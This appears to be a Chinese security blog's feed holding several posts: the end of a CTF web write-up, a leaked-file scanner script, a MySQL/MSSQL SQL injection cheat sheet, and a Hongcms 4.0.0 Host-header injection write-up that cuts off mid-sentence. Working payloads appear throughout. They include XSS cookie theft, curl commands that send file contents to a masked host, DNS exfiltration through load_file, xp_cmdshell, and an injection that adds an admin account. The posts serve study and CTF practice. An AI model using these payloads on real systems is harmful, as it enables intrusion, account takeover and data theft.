class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">如果你发现了该站点的bug,请将页面的URL提交给管理员,管理员会加上用户的token去登陆查验。</span><br><span class="line"></span><br><span class="line">感谢您的配合、</span><br></pre></td></tr></table></figure></p><p>之后执行代码界面需要管理员权限，很显然是XSS打管理员Cookie然后命令执行了<br>存在过滤，可以使用<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span></span></span><br><span class="line"><span class="tag">=<span class="string">alert(1)/</span>&gt;</span></span><br><span class="line">或者</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1);</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>执行命令的时候采用HTTP盲注入<br>用ceye平台<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://***/`ls /|grep flag` #找到带flag的文件</span><br><span class="line">curl http://***/`cat flag`</span><br></pre></td></tr></table></figure></p><h3 id="猜猜flag是什么"><a href="#猜猜flag是什么" class="headerlink" title="猜猜flag是什么"></a><font color="dark">猜猜flag是什么</font></h3><p>懒得写了，休息休息</p><h3 id="？？"><a href="#？？" class="headerlink" title="？？"></a><font color="dark">？？</font></h3><p>懒得写了，休息休息</p><blockquote><p>你是我患得患失的梦，我是你可有可无的人。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=&quot;green&quot;&gt;西湖论剑预选赛 Web部分题目解析&lt;/font&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>文件泄露扫描</title>
    <link href="http://yoursite.com/2019/04/10/SourceLeakHacker%20plus/"/>
    <id>http://yoursite.com/2019/04/10/SourceLeakHacker plus/</id>
    <published>2019-04-09T16:00:00.000Z</published>
    <updated>2019-04-10T14:32:04.433Z</updated>
    
    <content type="html"><![CDATA[<p><font color="green">对 <a href="https://github.com/WangYihang/SourceLeakHacker" target="_blank" rel="noopener">https://github.com/WangYihang/SourceLeakHacker</a> 进行修改，可以一次性扫描多个网站</font><br><a id="more"></a></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a><font color="dark">使用</font></h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">usage: <span class="title">infoFiles.py</span> [-<span class="title">h</span>] [--<span class="title">file</span> <span class="title">FILE</span>] [--<span class="title">url</span> <span class="title">URL</span>] [--<span class="title">save</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Sensitive</span> <span class="title">information</span> <span class="title">file</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">optional</span> <span class="title">arguments</span>:</span></span><br><span class="line"><span class="function">  -<span class="title">h</span>, --<span class="title">help</span>            <span class="title">show</span> <span class="title">this</span> <span class="title">help</span> <span class="title">message</span> <span class="title">and</span> <span class="title">exit</span></span></span><br><span class="line"><span class="function">  --<span class="title">file</span> <span class="title">FILE</span>, -<span class="title">f</span> <span class="title">FILE</span>  <span class="title">url</span> <span class="title">file</span></span></span><br><span class="line"><span class="function">  --<span class="title">url</span> <span class="title">URL</span>, -<span class="title">u</span> <span class="title">URL</span>     <span class="title">may</span> <span class="title">be</span> <span class="title">you</span> <span class="title">only</span> <span class="title">want</span> <span class="title">to</span> <span class="title">test</span> <span class="title">one</span> <span class="title">url</span></span></span><br><span class="line"><span class="function">  --<span class="title">save</span>, -<span class="title">s</span>            <span class="title">save</span> <span class="title">scan</span> <span class="title">infos</span></span></span><br></pre></td></tr></table></figure><p>f指定url文件，u指定单一url,s,将扫描信息保存</p><h3 id="4-10"><a href="#4-10" class="headerlink" title="4/10"></a><font color="dark">4/10</font></h3><p>暂无多线程的贫穷版本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ColorPrinter</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_red_text</span><span class="params">(self, content)</span>:</span></span><br><span class="line">        print(<span class="string">"\033[1;31;40m %s \033[0m"</span> % (content),end=<span class="string">''</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_green_text</span><span class="params">(self, content)</span>:</span></span><br><span class="line">        print(<span class="string">"\033[1;32;40m %s \033[0m"</span> % (content),end=<span class="string">''</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_blue_text</span><span class="params">(self, content)</span>:</span></span><br><span class="line">        print(<span class="string">"\033[1;34;40m %s \033[0m"</span> % (content),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure></p><p>定义一个类，输出不同颜色字体<br>PS:Linux系统下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">urlFormater</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> url.startswith(<span class="string">"http://"</span>)) <span class="keyword">and</span> (<span class="keyword">not</span> url.startswith(<span class="string">"https://"</span>)):</span><br><span class="line">        url = <span class="string">"http://"</span> + url</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.endswith(<span class="string">"/"</span>):</span><br><span class="line">        url += <span class="string">"/"</span></span><br><span class="line">    <span class="keyword">return</span> url</span><br></pre></td></tr></table></figure><p>对传入的url进行处理，修改为<code>http/https://example.com/的形式</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">parse = argparse.ArgumentParser(description=<span class="string">"Sensitive information file"</span>)</span><br><span class="line">parse.add_argument(<span class="string">'--file'</span>,<span class="string">'-f'</span>,help=<span class="string">'url file'</span>)</span><br><span class="line">parse.add_argument(<span class="string">'--url'</span>,<span class="string">'-u'</span>,help=<span class="string">'may be you only want to test one url'</span>)</span><br><span class="line">parse.add_argument(<span class="string">'--save'</span>,<span class="string">'-s'</span>,action=<span class="string">'store_true'</span>,help=<span class="string">'save scan infos'</span>)</span><br><span class="line">args = parse.parse_args()</span><br></pre></td></tr></table></figure><p>导入argparse模块，对传入参数进行处理，f指定url文件，u指定单一url,s,将扫描信息保存</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">listFile = open(<span class="string">'list.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> listFile:</span><br><span class="line">    i = i.replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">    i = i.replace(<span class="string">"\r"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"?"</span> <span class="keyword">in</span> i:</span><br><span class="line">        fileFile = open(<span class="string">'file.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> fileFile:</span><br><span class="line">            j = j.replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">            j = j.replace(<span class="string">"\r"</span>,<span class="string">""</span>)</span><br><span class="line">            temp = i.replace(<span class="string">"?"</span>,j)</span><br><span class="line">            urls.append(website + temp)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        urls.append(website + i)</span><br></pre></td></tr></table></figure><p>从list.txt文件中获取常见泄露文件，如果带有?，则从file.txt文件中获取文件替换?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">response = requests.head(url,timeout = timeout)</span><br><span class="line">code = response.status_code</span><br><span class="line">logs.append(str(code)+<span class="string">','</span>+url)</span><br><span class="line"><span class="keyword">if</span> code == <span class="number">200</span>:</span><br><span class="line">    colorPrinter.print_green_text(<span class="string">"[ "</span> + str(code) + <span class="string">" ]"</span>)</span><br><span class="line">    print(<span class="string">"Checking : "</span> + url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"404"</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        colorPrinter.print_blue_text(url + <span class="string">"\tMaybe every page same!"</span>)</span><br><span class="line"><span class="keyword">elif</span> code == <span class="number">404</span> <span class="keyword">or</span> code == <span class="number">405</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    colorPrinter.print_red_text(<span class="string">"[ "</span> + str(code) + <span class="string">" ]"</span>)</span><br><span class="line">    print(<span class="string">"Checking : "</span> + url)</span><br></pre></td></tr></table></figure><p>检测网站状况，输出并记录</p><h3 id="Git"><a href="#Git" class="headerlink" title="Git"></a><font color="dark">Git</font></h3><p><a href="https://github.com/No4l/MyTools/tree/master/SourceLeakHacker%20plus" target="_blank" rel="noopener">https://github.com/No4l/MyTools/tree/master/SourceLeakHacker%20plus</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=&quot;green&quot;&gt;对 &lt;a href=&quot;https://github.com/WangYihang/SourceLeakHacker&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/WangYihang/SourceLeakHacker&lt;/a&gt; 进行修改，可以一次性扫描多个网站&lt;/font&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>SQL Injection</title>
    <link href="http://yoursite.com/2019/04/08/sql%20injection/"/>
    <id>http://yoursite.com/2019/04/08/sql injection/</id>
    <published>2019-04-07T16:00:00.000Z</published>
    <updated>2019-04-08T15:35:49.280Z</updated>
    
    <content type="html"><![CDATA[<font color="green">对Mysql,Mmsql,PostgreSQL,MongoDB注入做的一些总结</font><a id="more"></a><h3 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a><font color="dark">Mysql</font></h3><h4 id="测试语句"><a href="#测试语句" class="headerlink" title="测试语句"></a>测试语句</h4><p>简单的测试是否存在有漏洞的Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 or 1=1</span><br><span class="line">1&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">&quot; or &quot;1&quot;=&quot;1</span><br><span class="line">1&apos; or 1=1 --</span><br><span class="line">1&quot; or 1=1 --</span><br><span class="line">and 0</span><br><span class="line">and 1</span><br><span class="line">1&apos; || &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h4 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h4><p>有SQL注入后当然要看下版本信息以及用户信息啦</p><table><thead><tr><th>Version()</th><th>获取数据库版本，也可以用@@version</th></tr></thead><tbody><tr><td>user()</td><td>获取数据库当前用户</td></tr><tr><td>@@basedir</td><td>获取MYSQL安装路径</td></tr><tr><td>@@datadir</td><td>读取数据库路径</td></tr></tbody></table><h4 id="数据信息"><a href="#数据信息" class="headerlink" title="数据信息"></a>数据信息</h4><h5 id="确认字段"><a href="#确认字段" class="headerlink" title="确认字段"></a>确认字段</h5><h6 id="Order-By"><a href="#Order-By" class="headerlink" title="Order By"></a>Order By</h6><p>最常见的方式</p><p>字段个数小于输入数的情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,id from users where id = -1 order by 3;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &apos;3&apos; in &apos;order clause&apos;</span><br></pre></td></tr></table></figure><p>字段个数大于或等于时候的情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,id from users where id = -1 order by 2;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><h6 id="Select…Into"><a href="#Select…Into" class="headerlink" title="Select…Into"></a>Select…Into</h6><p>从一个表中选取数据，然后把数据插入另一个表中,要求两表字段数相同，所以可以用这个方法判断出表的字段数</p><p>字段判断错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username from users where id=1 into @,@;</span><br><span class="line">ERROR 1222 (21000): The used SELECT statements have a different number of columns</span><br></pre></td></tr></table></figure><p>判断正确</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username from users where id=1 into @;</span><br><span class="line">ERROR 3061 (42000): User variable name &apos;&apos; is illegal</span><br></pre></td></tr></table></figure><p>也有<strong>limit</strong>的时候可以这样子判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username from users where id=1 limit 1,1 into @;</span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username from users where id=1 limit 1,1 into @,@;</span><br><span class="line">ERROR 1222 (21000): The used SELECT statements have a different number of columns</span><br></pre></td></tr></table></figure><h5 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h5><h6 id="union查询"><a href="#union查询" class="headerlink" title="union查询"></a>union查询</h6><p>当知道字段数以后可以用union查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username from users where id=-1 union select group_concat(table_name) from information_schema.tables where table_schema=database();</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| username                                |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| emails,logs,referers,uagents,user,users |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h6 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h6><p>使用if,sleep结合其他函数使用</p><h6 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h6><p>通过floor/ceil报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username from users where id=1 and (select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;~emails~1&apos; for key &apos;&lt;group_key&gt;&apos;</span><br></pre></td></tr></table></figure><p>ExtractValue</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username from users where id=1 and extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:emails,logs,referers,uagents,us&apos;</span><br></pre></td></tr></table></figure><p>updatexml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1062 (23000): Duplicate entry &apos;~emails~1&apos; for key &apos;&lt;group_key&gt;&apos;</span><br><span class="line">mysql&gt; select username from users where id=1 and updatexml(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:emails,logs,referers,uagents,us&apos;</span><br></pre></td></tr></table></figure><h5 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h5><p>除了用查表名的三种方式外，如果是limit的话还可以用procedure analyse()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users limit 1,1 procedure analyse();</span><br><span class="line">+-------------------------+-----------+------------+------------+------------+------------------+-------+-------------------------+------+------------------------------------+</span><br><span class="line">| Field_name              | Min_value | Max_value  | Min_length | Max_length | Empties_or_zeros | Nulls | Avg_value_or_avg_length | Std  | Optimal_fieldtype                  |</span><br><span class="line">+-------------------------+-----------+------------+------------+------------+------------------+-------+-------------------------+------+------------------------------------+</span><br><span class="line">| security.users.username | Angelina  | Dumb       |          4 |          8 |                0 |     0 | 6.0000                  | NULL | ENUM(&apos;Angelina&apos;,&apos;Dumb&apos;) NOT NULL   |</span><br><span class="line">| security.users.password | Dumb      | I-kill-you |          4 |         10 |                0 |     0 | 7.0000                  | NULL | ENUM(&apos;Dumb&apos;,&apos;I-kill-you&apos;) NOT NULL |</span><br><span class="line">+-------------------------+-----------+------------+------------+------------+------------------+-------+-------------------------+------+------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><p><strong>先决条件</strong>：secure_file_priv不为null</p><p>使用@@secure_file_priv查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@secure_file_priv;</span><br><span class="line">+--------------------+</span><br><span class="line">| @@secure_file_priv |</span><br><span class="line">+--------------------+</span><br><span class="line">|                    |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><p>load_file</p><p>加入我要读取C盘下的test文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select load_file(&apos;C:/test&apos;);</span><br><span class="line">+------------------------------------+</span><br><span class="line">| load_file(&apos;C:/test&apos;)               |</span><br><span class="line">+------------------------------------+</span><br><span class="line">| 1     2.0     3.0     4       5       6       7       8       9       10      11      12        13</span><br><span class="line"> |</span><br><span class="line">+------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>文件可以用hex编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select load_file(0x433A2F74657374);</span><br><span class="line">+------------------------------------+</span><br><span class="line">| load_file(0x433A2F74657374)        |</span><br><span class="line">+------------------------------------+</span><br><span class="line">| 1     2.0     3.0     4       5       6       7       8       9       10      11      12        13</span><br><span class="line"> |</span><br><span class="line">+------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>http盲攻击</p><p>利用<a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io</a>之类的平台</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select load_file(concat(&quot;\\\\&quot;,@@version,&quot;.d2uj0t.ceye.io\\a&quot;));</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">| load_file(concat(&quot;\\\\&quot;,@@version,&quot;.d****t.ceye.io\\a&quot;)) |</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">| NULL                                                     |</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">1 row in set (9.50 sec)</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">ID</th><th style="text-align:left">Name</th><th style="text-align:left">Remote Addr</th><th style="text-align:left">Created At (UTC+0)</th></tr></thead><tbody><tr><td style="text-align:left">7011913</td><td style="text-align:left">5.7.14.<strong>*</strong>.ceye.io</td><td style="text-align:left">127.0.0.1</td><td style="text-align:left">2019-04-08 14:38:13</td></tr></tbody></table><h5 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h5><p>INTO OUTFILE</p><h4 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h4><p>如果开启了多句一起执行的模式，可以采用预处理来解决一些过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @s=&quot;select * from users;&quot;;//可采用ascii编码形如 chr(100,121)，concat可进行连接concat(chr(100,121))</span><br><span class="line">prepare sql from @s;</span><br><span class="line">execute sql;</span><br></pre></td></tr></table></figure><hr><p>后续继续补充</p><h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a><font color="dark">MSSQL</font></h3><p>安装SQL Server的时候出了点儿问题，最后用的VS的本地数据库，可能存在一些问题</p><h4 id="测试语句-1"><a href="#测试语句-1" class="headerlink" title="测试语句"></a>测试语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1 or 1=1</span><br><span class="line">&quot; or &quot;1&quot;=&quot;1</span><br><span class="line">1&apos; or 1=1 --</span><br><span class="line">1&quot; or 1=1 --</span><br><span class="line">and 0</span><br><span class="line">and 1</span><br><span class="line">1&apos; || &apos;1&apos;=&apos;1</span><br><span class="line">&apos;; exec master..xp_cmdshell &apos;ping 10.10.1.2&apos;--</span><br><span class="line">&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">&apos; union (select @@version) --</span><br><span class="line">&apos; union (select NULL, (select @@version)) --</span><br><span class="line">&apos; union (select NULL, NULL, (select @@version)) --</span><br><span class="line">&apos; union (select NULL, NULL, NULL,  (select @@version)) --</span><br><span class="line">&apos; union (select NULL, NULL, NULL, NULL,  (select @@version)) --</span><br><span class="line">&apos; union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --</span><br></pre></td></tr></table></figure><h5 id="信息获取-1"><a href="#信息获取-1" class="headerlink" title="信息获取"></a>信息获取</h5><table><thead><tr><th>@@VERSION</th><th><strong>获取版本</strong></th></tr></thead><tbody><tr><td>@@SERVERNAME</td><td><strong>获取主机名</strong></td></tr></tbody></table><p>获取用户名及密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user,password from master.dbo.syslogins;</span><br></pre></td></tr></table></figure><h5 id="数据信息-1"><a href="#数据信息-1" class="headerlink" title="数据信息"></a>数据信息</h5><h6 id="获取库名"><a href="#获取库名" class="headerlink" title="获取库名"></a>获取库名</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from master..sysdatabases;</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>name</th></tr></thead><tbody><tr><td>1</td><td>master</td></tr><tr><td>2</td><td>tempdb</td></tr><tr><td>3</td><td>model</td></tr><tr><td>4</td><td>msdb</td></tr><tr><td>5</td><td>C:\USERS\Noel\SOURCE\REPOS\WPFAPP6\WPFAPP6\BIN\DEBUG\DATABASE1.MDF</td></tr></tbody></table><p>报错获取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from dbo.MyTable1 where id=0 or 0&lt;&gt;db_name(1);</span><br><span class="line">Msg 245, Level 16, State 1, Line 1</span><br><span class="line">Conversion failed when converting the nvarchar value &apos;master&apos; to data type int.</span><br></pre></td></tr></table></figure><p>将db_name()中的数字改变即可获取不同库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from dbo.MyTable1 where id=0 or 0=(select top 1 table_name from INFORMATION_SCHEMA.TABLES);</span><br><span class="line"></span><br><span class="line">Msg 245, Level 16, State 1, Line 1</span><br><span class="line">Conversion failed when converting the nvarchar value &apos;MyTable1&apos; to data type int.</span><br></pre></td></tr></table></figure><hr><p>后续待补充</p><h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a><font color="dark">PostgreSQL</font></h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484788&amp;idx=1&amp;sn=8a53b1c64d864cd01bab095d97a17715&amp;chksm=ec1e355cdb69bc4a2535bc1a053bfde3ec1838d03936ba8e44156818e91bbec9b5b04a744005#rd" target="_blank" rel="noopener">postgresql数据库利用方式 </a> 简单的看了下，还未深入了解，后续补充</p><h3 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a><font color="dark">MongoDB</font></h3><p>暂未安装，后续补充</p>]]></content>
    
    <summary type="html">
    
      &lt;font color=&quot;green&quot;&gt;对Mysql,Mmsql,PostgreSQL,MongoDB注入做的一些总结&lt;/font&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="SQL" scheme="http://yoursite.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Hongcms 4.0.0</title>
    <link href="http://yoursite.com/2019/04/05/hongcms/"/>
    <id>http://yoursite.com/2019/04/05/hongcms/</id>
    <published>2019-04-04T16:00:00.000Z</published>
    <updated>2019-04-05T07:49:53.965Z</updated>
    
    <content type="html"><![CDATA[<font color="green">Because there is no filtering of the Host header, there are at least two SQL injections.</font><a id="more"></a><h3 id="Register"><a href="#Register" class="headerlink" title="Register"></a><font color="dark">Register</font></h3><p>When we fill out the information, click Submit and capture the package.Modify the Host value to <code>&#39; or updatexml(1, concat(0x7e,user(),0x7e),1) or &#39;</code>Add X-Forwarded-For and it’s value is <code>a</code>,then we put the package.</p><p><img src="/2019/04/05/hongcms/1.png" alt></p><p>We can also add an administrator account or an active normal account.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Host: &apos;,1,&apos;&apos;,&apos;&apos;),(1,1,&apos;aadmin&apos;,md5(&apos;12345&apos;),&apos;&apos;,&apos;1554448599&apos;,&apos;</span><br><span class="line">X-Forwarded-For: a</span><br></pre></td></tr></table></figure><p>Added a active user for the below.</p><p><img src="/2019/04/05/hongcms/2.png" alt></p><p>The active user has been inserted in the database.</p><p>Because register need to re-catch each time,we can use the login to get more information.</p><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a><font color="dark">Login</font></h3><p>Use the active user to 